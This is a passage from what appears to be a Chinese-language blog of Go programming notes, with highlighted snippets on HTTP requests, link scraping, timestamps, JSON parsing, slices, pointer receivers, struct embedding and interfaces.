fmt.Println(<span class="string">"read error"</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(string(body))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">package main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"fmt"</span></span><br><span class="line">	<span class="string">"github.com/jackdanger/collectlinks"</span></span><br><span class="line">	<span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line">func main() &#123;</span><br><span class="line">	fmt.Println(<span class="string">"Hello, world"</span>)</span><br><span class="line">	url := <span class="string">"http://www.baidu.com/"</span></span><br><span class="line">	download(url)</span><br><span class="line">&#125;</span><br><span class="line">func download(url string) &#123;</span><br><span class="line">	client := &amp;http.Client&#123;&#125;</span><br><span class="line">	req, <span class="attr">_</span> := http.NewRequest(<span class="string">"GET"</span>, url, nil)</span><br><span class="line">	<span class="comment">// 自定义Header</span></span><br><span class="line">	req.Header.Set(<span class="string">"User-Agent"</span>, <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>)</span><br><span class="line">	resp, <span class="attr">err</span> := client.Do(req)</span><br><span class="line">	<span class="keyword">if</span> err != nil &#123;</span><br><span class="line">		fmt.Println(<span class="string">"http get error"</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//函数结束后关闭相关链接</span></span><br><span class="line">	defer resp.Body.Close()</span><br><span class="line">	links := collectlinks.All(resp.Body)</span><br><span class="line">	<span class="keyword">for</span> _, <span class="attr">link</span> := range links &#123;</span><br><span class="line">		fmt.Println(<span class="string">"parse url"</span>, link)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="go-实现一个简单的-mvc"><a href="#go-实现一个简单的-mvc" class="headerlink" title="go 实现一个简单的 mvc"></a>go 实现一个简单的 mvc</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/jc91715/go-simple-mvc</span></span><br><span class="line">go get github.com/astaxie/beego</span><br><span class="line">go get github.com/go-sql-driver/mysql</span><br><span class="line"></span><br><span class="line">go run main.go</span><br><span class="line">https:<span class="comment">//learnku.com/articles/29546</span></span><br></pre></td></tr></table></figure>
<h3 id="时间戳操作大全"><a href="#时间戳操作大全" class="headerlink" title="时间戳操作大全"></a>时间戳操作大全</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">dateTime := time.Now()</span><br><span class="line">fmt.Println(dateTime)</span><br><span class="line">year := time.Now().Year() <span class="comment">//年</span></span><br><span class="line"></span><br><span class="line">fmt.Println(year)</span><br><span class="line"></span><br><span class="line">month := time.Now().Month() <span class="comment">//月</span></span><br><span class="line">fmt.Println(month)</span><br><span class="line"></span><br><span class="line">fmt.Println(time.Now().Format(<span class="string">"2006-01-02 15:04:05"</span>))</span><br><span class="line">t := time.Date(<span class="number">2014</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">50</span>, <span class="number">4</span>, <span class="number">0</span>, time.Local).Unix()</span><br><span class="line">https:<span class="comment">//learnku.com/golang/t/30925</span></span><br></pre></td></tr></table></figure>
<h3 id="request"><a href="#request" class="headerlink" title="request"></a>request</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">package http</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line">    <span class="string">"github.com/imroc/req"</span></span><br><span class="line">    logger <span class="string">"xxx"</span> <span class="comment">//logger日志封装</span></span><br><span class="line">    util <span class="string">"xxxx/sdk-utils"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">type method string</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    GET    method = <span class="string">"GET"</span></span><br><span class="line">    POST   method = <span class="string">"POST"</span></span><br><span class="line">    PUT    method = <span class="string">"PUT"</span></span><br><span class="line">    PATCH  method = <span class="string">"PATCH"</span></span><br><span class="line">    DELETE method = <span class="string">"DELETE"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">type Response struct &#123;</span><br><span class="line">    Data []byte</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//反序列化操作</span></span><br><span class="line">func (r *Response) Deserialize(object interface&#123;&#125;) (err error) &#123;</span><br><span class="line">    err = util.JSONUnmarshal(r.Data, object)</span><br><span class="line">    <span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//支持所有类型请求.</span></span><br><span class="line">func Request(method method, url string, v ...interface&#123;&#125;) (response *Response, err error) &#123;</span><br><span class="line">    <span class="keyword">var</span> r *req.Resp</span><br><span class="line">    response = <span class="keyword">new</span>(Response)</span><br><span class="line">    <span class="keyword">switch</span> method &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"GET"</span>:</span><br><span class="line">        r, err = req.Get(url, v...)</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"POST"</span>:</span><br><span class="line">        r, err = req.Post(url, v...)</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"PUT"</span>:</span><br><span class="line">        r, err = req.Put(url, v...)</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"PATCH"</span>:</span><br><span class="line">        r, err = req.Patch(url, v...)</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"DELETE"</span>:</span><br><span class="line">        r, err = req.Delete(url, v...)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    statusCode := r.Response().StatusCode</span><br><span class="line">    <span class="keyword">if</span> statusCode != <span class="number">200</span> &#123;</span><br><span class="line">        err = fmt.Errorf(<span class="string">"http cilent code err: %d"</span>, statusCode)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response.Data = r.Bytes()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/30935</span></span><br></pre></td></tr></table></figure>
<h3 id="golang代理"><a href="#golang代理" class="headerlink" title="golang代理"></a>golang代理</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> GO111MODULE=on</span><br><span class="line"><span class="keyword">export</span> GOPROXY=https:<span class="comment">//goproxy.io</span></span><br></pre></td></tr></table></figure>
<h3 id="递归打印杨辉三角"><a href="#递归打印杨辉三角" class="headerlink" title="递归打印杨辉三角"></a>递归打印杨辉三角</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    YangHuiTriangle(<span class="number">10</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//https://learnku.com/articles/31290</span></span><br><span class="line">func YangHuiTriangle(n int) []int &#123;</span><br><span class="line">    i := n - <span class="number">1</span></span><br><span class="line">    line := make([]int, n)</span><br><span class="line">    <span class="keyword">if</span> i &lt;= <span class="number">0</span> &#123;</span><br><span class="line">        line = []int&#123;<span class="number">1</span>&#125;</span><br><span class="line">        fmt.Println(line)</span><br><span class="line">        <span class="keyword">return</span> line</span><br><span class="line">    &#125;</span><br><span class="line">    down := YangHuiTriangle(i)</span><br><span class="line">    <span class="keyword">for</span> x := <span class="number">0</span>; x &lt; n; x++ &#123;</span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">0</span> &#123;</span><br><span class="line">            line[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> x == n<span class="number">-1</span> &#123;</span><br><span class="line">            line[x] = <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        line[x] = down[x<span class="number">-1</span>] + down[x]</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(line)</span><br><span class="line">    <span class="keyword">return</span> line</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="JSON-解析"><a href="#JSON-解析" class="headerlink" title="JSON 解析"></a>JSON 解析</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"encoding/json"</span></span><br><span class="line">    <span class="string">"time"</span></span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    type Fruit struct &#123;</span><br><span class="line">        Name string <span class="string">`json:"Name"`</span></span><br><span class="line">        PriceTag string <span class="string">`json:"PriceTag"`</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    type FruitBasket struct &#123;</span><br><span class="line">        Name    string </span><br><span class="line">        Fruit   map[string]Fruit</span><br><span class="line">        Id      int64 <span class="string">`json:"ref"`</span><span class="comment">// 声明对应的json key</span></span><br><span class="line">        Created time.Time</span><br><span class="line"></span><br><span class="line">    &#125;    </span><br><span class="line">    jsonData := []byte(<span class="string">`</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        "Name": "Standard",</span></span><br><span class="line"><span class="string">        "Fruit" : &#123;</span></span><br><span class="line"><span class="string">        "1": &#123;</span></span><br><span class="line"><span class="string">        "Name": "Apple",</span></span><br><span class="line"><span class="string">        "PriceTag": "$1"</span></span><br><span class="line"><span class="string">        &#125;,</span></span><br><span class="line"><span class="string">        "2": &#123;</span></span><br><span class="line"><span class="string">        "Name": "Pear",</span></span><br><span class="line"><span class="string">        "PriceTag": "$1.5"</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        &#125;,</span></span><br><span class="line"><span class="string">        "ref": 999,</span></span><br><span class="line"><span class="string">        "Created": "2018-04-09T23:00:00Z"</span></span><br><span class="line"><span class="string">    &#125;`</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> basket FruitBasket</span><br><span class="line">    err := json.Unmarshal(jsonData, &amp;basket)</span><br><span class="line">    <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">         fmt.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> _, <span class="attr">item</span> := range basket.Fruit &#123;</span><br><span class="line">    fmt.Println(item.Name, item.PriceTag)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//https://learnku.com/articles/31320</span></span><br></pre></td></tr></table></figure>
<h3 id="go-的切片"><a href="#go-的切片" class="headerlink" title="go 的切片"></a>go 的切片</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">对于 go 语言的数组，copy 和 view 是同时都存在的。</span><br><span class="line"></span><br><span class="line">copy 就是使用这个数组的时候我将这个数组拷贝一份，这样对于数组的增删改，是不会改变原数组的值的</span><br><span class="line">view 由数组执行切片所返回的对象是一个 view，即视图，若我们在视图上操作数组，会改变原数组，</span><br><span class="line">copy 场景</span><br><span class="line"></span><br><span class="line">package  main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  (</span><br><span class="line">  <span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func  updateArr(arr [<span class="number">5</span>]int)  &#123;</span><br><span class="line">  arr[<span class="number">0</span>]  =  <span class="number">100</span></span><br><span class="line">  fmt.Println(<span class="string">"修改后的arr："</span>, arr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func  main()  &#123;</span><br><span class="line">  arr3  :=  [...]int&#123;<span class="number">2</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>&#125;</span><br><span class="line">  fmt.Println(<span class="string">"原来的："</span>, arr3)</span><br><span class="line">  updateArr(arr3)</span><br><span class="line">  fmt.Println(<span class="string">"再次查看原始的："</span>, arr3)</span><br><span class="line">&#125;</span><br><span class="line">输出结果：</span><br><span class="line">原来的： [<span class="number">2</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span>]</span><br><span class="line">修改后的arr： [<span class="number">100</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span>]</span><br><span class="line">再次查看原始的： [<span class="number">2</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span>]</span><br><span class="line">如上代码可以看到，我们在 updateArr 里面修改了下标为 <span class="number">0</span> 的值，但是我们输出原始数组的时候，并没有变。这就是对数组 copy。</span><br><span class="line"></span><br><span class="line">view 场景</span><br><span class="line"></span><br><span class="line">func  updateArr(arr []int)  &#123;</span><br><span class="line">  arr[<span class="number">0</span>]  =  <span class="number">100</span></span><br><span class="line">  fmt.Println(<span class="string">"修改后的arr："</span>, arr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func  main()  &#123;</span><br><span class="line">  arr3  :=  [...]int&#123;<span class="number">2</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>&#125;</span><br><span class="line">  fmt.Println(<span class="string">"原来的："</span>, arr3)</span><br><span class="line">  <span class="comment">// 使用切片</span></span><br><span class="line">  updateArr(arr3[:])</span><br><span class="line">  fmt.Println(<span class="string">"再次查看原始的："</span>, arr3)</span><br><span class="line">&#125;</span><br><span class="line">输出结果：</span><br><span class="line">原来的： [<span class="number">2</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span>]</span><br><span class="line">修改后的arr： [<span class="number">100</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span>]</span><br><span class="line">再次查看原始的： [<span class="number">100</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span>]</span><br><span class="line">为什么 view 能够改变原数组</span><br><span class="line"></span><br><span class="line">虽然 Slice 本身是值类型，但是它内部使用了对数组的指针引用，所以修改切片数据，会将数组原有数据修改掉。</span><br><span class="line"></span><br><span class="line">当然，在理解上面的同时，一定要知道 go 是如何定义一个切片的</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b []int</span><br><span class="line">所以，在 updateArr 这个函数传参的时候 arr []int 是传切片进去。不然会报错 https:<span class="comment">//learnku.com/articles/32171</span></span><br></pre></td></tr></table></figure>
<h3 id="结构体的值传递和引用传递"><a href="#结构体的值传递和引用传递" class="headerlink" title="结构体的值传递和引用传递"></a>结构体的值传递和引用传递</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">值传递</span><br><span class="line"></span><br><span class="line">type person struct &#123;</span><br><span class="line">    name string</span><br><span class="line">    age int</span><br><span class="line">    gender string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法定义</span></span><br><span class="line">func (p person) setName(name string) &#123;</span><br><span class="line">    p.name = name</span><br><span class="line">    fmt.Println(<span class="string">"person name is:"</span>,  p.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (p *person) describe() &#123;</span><br><span class="line">    fmt.Printf(<span class="string">"我叫 %v, 我今年 %v 了"</span>, p.name, p.age)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    p := person&#123;<span class="string">"Tom"</span>, <span class="number">22</span>, <span class="string">"man"</span>&#125;</span><br><span class="line">    <span class="comment">// 修改name的值</span></span><br><span class="line">    p.setName(<span class="string">"jury"</span>)</span><br><span class="line">    p.describe()</span><br><span class="line">&#125;</span><br><span class="line">如上，我们在 setName 这个函数的接受者 是 p person。 此时，就相当于把 person&#123;<span class="string">"Tom"</span>, <span class="number">22</span>, <span class="string">"man"</span>&#125; 拷贝一份传递过去。</span><br><span class="line">引用传递</span><br><span class="line"></span><br><span class="line">引用传递就是将该值在内存中的存储地址传递过去。</span><br><span class="line"></span><br><span class="line">type person struct &#123;</span><br><span class="line">    name string</span><br><span class="line">    age int</span><br><span class="line">    gender string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法定义</span></span><br><span class="line">func (p *person) setName(name string) &#123;</span><br><span class="line">    p.name = name</span><br><span class="line">    fmt.Println(<span class="string">"person name is:"</span>,  p.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (p *person) describe() &#123;</span><br><span class="line">    fmt.Printf(<span class="string">"我叫 %v, 我今年 %v 了"</span>, p.name, p.age)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    p := person&#123;<span class="string">"Tom"</span>, <span class="number">22</span>, <span class="string">"man"</span>&#125;</span><br><span class="line">    <span class="comment">// 修改name的值</span></span><br><span class="line">    p.setName(<span class="string">"jury"</span>)</span><br><span class="line">    p.describe()</span><br><span class="line">&#125;</span><br><span class="line">我们在 setName 这个函数的接受者 是 p *person。 此时，就相当于把 person&#123;<span class="string">"Tom"</span>, <span class="number">22</span>, <span class="string">"man"</span>&#125; 存储地址传递过去。</span><br><span class="line">https:<span class="comment">//learnku.com/articles/32233</span></span><br></pre></td></tr></table></figure>
<h3 id="实现继承"><a href="#实现继承" class="headerlink" title="实现继承"></a>实现继承</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">  <span class="string">"fmt"</span></span><br><span class="line">  <span class="string">"strconv"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 动物类</span></span><br><span class="line">type Animal struct &#123;</span><br><span class="line">  name string</span><br><span class="line">  subject string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 动物的公共方法</span></span><br><span class="line">func (a *Animal) eat(food string) &#123;</span><br><span class="line">  fmt.Println(a.name + <span class="string">"喜欢吃："</span> + food +<span class="string">",它属于:"</span> + a.subject)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 猫类，继承动物类https://learnku.com/articles/32295#reply102908</span></span><br><span class="line">type Cat struct &#123;</span><br><span class="line">  <span class="comment">// 继承动物的属性和方法</span></span><br><span class="line">  Animal</span><br><span class="line">  <span class="comment">// 猫自己的属性</span></span><br><span class="line">  age int</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 猫类独有的方法 type name struct&#123;&#125; 结构体 就相当于其他语言中的 class 类的概念。</span></span><br><span class="line">func (c Cat) sleep() &#123;</span><br><span class="line">  fmt.Println(c.name + " 今年" + strconv.Itoa(c.age) + "岁了,特别喜欢睡觉")# go 语言中，string + int，如果想要一个字符串，则需要对 int 类型的值转换为 string 类型，然后才能拼接。</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">  <span class="comment">// 创建一个动物类</span></span><br><span class="line">  animal := Animal&#123;<span class="attr">name</span>:<span class="string">"动物"</span>, <span class="attr">subject</span>:<span class="string">"动物科"</span>&#125;</span><br><span class="line">  animal.eat(<span class="string">"肉"</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 创建一个猫类</span></span><br><span class="line">  cat := Cat&#123;<span class="attr">Animal</span>: Animal&#123;<span class="attr">name</span>:<span class="string">"咪咪"</span>, <span class="attr">subject</span>:<span class="string">"猫科"</span>&#125;,<span class="attr">age</span>:<span class="number">1</span>&#125;</span><br><span class="line">  cat.eat(<span class="string">"鱼"</span>)</span><br><span class="line">  cat.sleep()</span><br><span class="line">&#125;</span><br><span class="line">输出结果：</span><br><span class="line">    动物喜欢吃：肉,它属于:动物科</span><br><span class="line">    咪咪喜欢吃：鱼,它属于:猫科</span><br><span class="line">    咪咪 今年<span class="number">1</span>岁了,特别喜欢睡觉</span><br></pre></td></tr></table></figure>
<p>###<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">如果之前学过 PHP 或者其他语言，可以知道实现一个接口，不仅需要实现其接口里的方法，也需要使用 implements 显式说明其实现了该接口。</span><br><span class="line">go 则是 duck type，即像鸭子，那它就可以是个鸭子。也就是说，在 go 中，是要是结构体实现了某个接口指定的方法，那它就是实现了这个接口，不需要使用 implements 显式说明。</span><br><span class="line"></span><br><span class="line">现在说一下接口优点，最大的莫过于控制反转和解耦。举个例子，比如设计一个发送短信的服务，我想接入阿里云与腾讯云的短信业务，此时应该如何设计比较好？是在最底层通过 type 分类来区分，还是在上层通过传入不同的服务，来对应发送不同的运营商短信比较优雅？其实看 laravel 框架上的实现就很明白了。</span><br><span class="line"></span><br><span class="line">同时，go 中的多态的特性通过接口来展现的。</span><br><span class="line"></span><br><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span 